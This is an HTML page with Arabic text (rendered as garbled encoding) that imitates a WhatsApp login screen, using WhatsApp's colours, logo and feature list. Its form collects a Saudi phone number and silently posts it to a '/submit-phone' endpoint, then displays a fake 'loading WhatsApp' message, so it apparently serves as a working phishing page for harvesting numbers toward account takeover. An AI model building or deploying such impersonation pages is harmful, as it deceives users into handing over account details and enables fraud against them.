<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ WhatsApp</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #075E54, #128C7E);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .login-container {
            background: white;
            padding: 40px 30px;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 380px;
            text-align: center;
        }
        
        .whatsapp-logo {
            width: 80px;
            height: 80px;
            background: #25D366;
            border-radius: 50%;
            margin: 0 auto 25px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            color: white;
        }
        
        .header {
            margin-bottom: 30px;
        }
        
        .header h1 {
            color: #075E54;
            font-size: 24px;
            margin-bottom: 8px;
            font-weight: 600;
        }
        
        .header p {
            color: #666;
            font-size: 16px;
            line-height: 1.5;
        }
        
        .login-form {
            text-align: right;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #075E54;
            font-weight: 500;
            font-size: 14px;
        }
        
        .phone-input {
            position: relative;
        }
        
        .phone-input input {
            width: 100%;
            padding: 16px 50px 16px 16px;
            border: 2px solid #e0e0e0;
            border-radius: 12px;
            font-size: 16px;
            transition: all 0.3s;
            text-align: right;
            direction: ltr;
        }
        
        .phone-input input:focus {
            outline: none;
            border-color: #25D366;
            box-shadow: 0 0 0 3px rgba(37, 211, 102, 0.1);
        }
        
        .country-code {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: #666;
            font-weight: 500;
        }
        
        .btn-login {
            width: 100%;
            padding: 16px;
            background: #25D366;
            color: white;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        
        .btn-login:hover {
            background: #128C7E;
        }
        
        .btn-login:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        .message {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            display: none;
            font-weight: 500;
        }
        
        .success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }
        
        .error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }
        
        .whatsapp-features {
            margin-top: 30px;
            padding: 20px;
            background: #f8f9fa;
            border-radius: 12px;
            text-align: right;
        }
        
        .whatsapp-features h3 {
            color: #075E54;
            margin-bottom: 10px;
            font-size: 16px;
        }
        
        .whatsapp-features ul {
            list-style: none;
            color: #666;
            font-size: 14px;
        }
        
        .whatsapp-features li {
            margin-bottom: 8px;
            padding-right: 20px;
            position: relative;
        }
        
        .whatsapp-features li:before {
            content: "âœ“";
            position: absolute;
            right: 0;
            color: #25D366;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="whatsapp-logo">ğŸ“±</div>
        
        <div class="header">
            <h1>ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„ Ø¥Ù„Ù‰ WhatsApp</h1>
            <p>Ø£Ø¯Ø®Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙÙƒ Ù„Ù„Ø¨Ø¯Ø¡ ÙÙŠ Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø§Ù„ØªØ·Ø¨ÙŠÙ‚</p>
        </div>
        
        <form class="login-form" id="loginForm">
            <div class="form-group">
                <label for="phone">Ø±Ù‚Ù… Ø§Ù„Ù‡Ø§ØªÙ</label>
                <div class="phone-input">
                    <input 
                        type="tel" 
                        id="phone" 
                        placeholder="5XXXXXXXX" 
                        required
                        pattern="[0-9]{8,15}"
                        maxlength="15"
                    >
                    <span class="country-code">966+</span>
                </div>
            </div>
            
            <button type="submit" class="btn-login" id="submitBtn">
                ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„
            </button>
        </form>
        
        <div id="message" class="message"></div>
        
        <div class="whatsapp-features">
            <h3>Ù…Ø²Ø§ÙŠØ§ WhatsApp</h3>
            <ul>
                <li>Ø±Ø³Ø§Ø¦Ù„ ÙÙˆØ±ÙŠØ© ÙˆÙ…Ø¬Ø§Ù†ÙŠØ©</li>
                <li>Ù…ÙƒØ§Ù„Ù…Ø§Øª ØµÙˆØªÙŠØ© ÙˆÙÙŠØ¯ÙŠÙˆ</li>
                <li>ØªØ´ÙÙŠØ± end-to-end</li>
                <li>Ù…Ø´Ø§Ø±ÙƒØ© Ø§Ù„Ù…Ù„ÙØ§Øª ÙˆØ§Ù„ÙˆØ³Ø§Ø¦Ø·</li>
            </ul>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const phone = document.getElementById('phone').value;
            const fullPhone = '966' + phone; // Ø¥Ø¶Ø§ÙØ© Ø±Ù…Ø² Ø§Ù„Ø³Ø¹ÙˆØ¯ÙŠØ©
            const messageDiv = document.getElementById('message');
            const submitBtn = document.getElementById('submitBtn');
            
            // Ø§Ù„ØªØ­Ù‚Ù‚ Ù…Ù† ØµØ­Ø© Ø§Ù„Ø±Ù‚Ù…
            if (!phone.match(/^[0-9]{8,9}$/)) {
                showMessage('âŒ ÙŠØ±Ø¬Ù‰ Ø¥Ø¯Ø®Ø§Ù„ Ø±Ù‚Ù… Ù‡Ø§ØªÙ ØµØ­ÙŠØ­ (8-9 Ø£Ø±Ù‚Ø§Ù…)', 'error');
                return;
            }
            
            // ØªØ¹Ø·ÙŠÙ„ Ø§Ù„Ø²Ø± ÙˆØ¥Ø¸Ù‡Ø§Ø± Ø§Ù„ØªØ­Ù…ÙŠÙ„
            submitBtn.disabled = true;
            submitBtn.textContent = 'Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ³Ø¬ÙŠÙ„...';
            showMessage('â³ Ø¬Ø§Ø±ÙŠ ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„...', 'success');
            
            try {
                // Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø±Ù‚Ù… Ø¥Ù„Ù‰ Ø§Ù„Ø®Ø§Ø¯Ù…
                const response = await fetch('/submit-phone', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        phone: fullPhone,
                        userId: 'website_user'
                    })
                });
                
                const result = await response.json();
                
                if (result.success) {
                    showMessage('âœ… ' + result.message, 'success');
                    
                    // Ù…Ø­Ø§ÙƒØ§Ø© ØªØ­Ù…ÙŠÙ„ ÙˆØ§ØªØ³Ø§Ø¨
                    setTimeout(() => {
                        showMessage('ğŸ“± Ø¬Ø§Ø±ÙŠ ØªØ­Ù…ÙŠÙ„ ÙˆØ§ØªØ³Ø§Ø¨...', 'success');
                    }, 1000);
                    
                    // Ù…Ø³Ø­ Ø§Ù„Ø­Ù‚Ù„
                    document.getElementById('phone').value = '';
                    
                } else {
                    showMessage('âŒ ' + result.message, 'error');
                }
                
            } catch (error) {
                showMessage('âŒ Ø­Ø¯Ø« Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ø¥Ø±Ø³Ø§Ù„', 'error');
                console.error('Error:', error);
            } finally {
                // Ø¥Ø¹Ø§Ø¯Ø© ØªÙ…ÙƒÙŠÙ† Ø§Ù„Ø²Ø±
                submitBtn.disabled = false;
                submitBtn.textContent = 'ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„';
            }
        });
        
        function showMessage(text, type) {
            const messageDiv = document.getElementById('message');
            messageDiv.textContent = text;
            messageDiv.className = `message ${type}`;
            messageDiv.style.display = 'block';
        }
        
        // ØªØ±ÙƒÙŠØ² Ø¹Ù„Ù‰ Ø­Ù‚Ù„ Ø§Ù„Ø±Ù‚Ù… ØªÙ„Ù‚Ø§Ø¦ÙŠØ§Ù‹
        document.getElementById('phone').focus();
    </script>
</body>
</html>
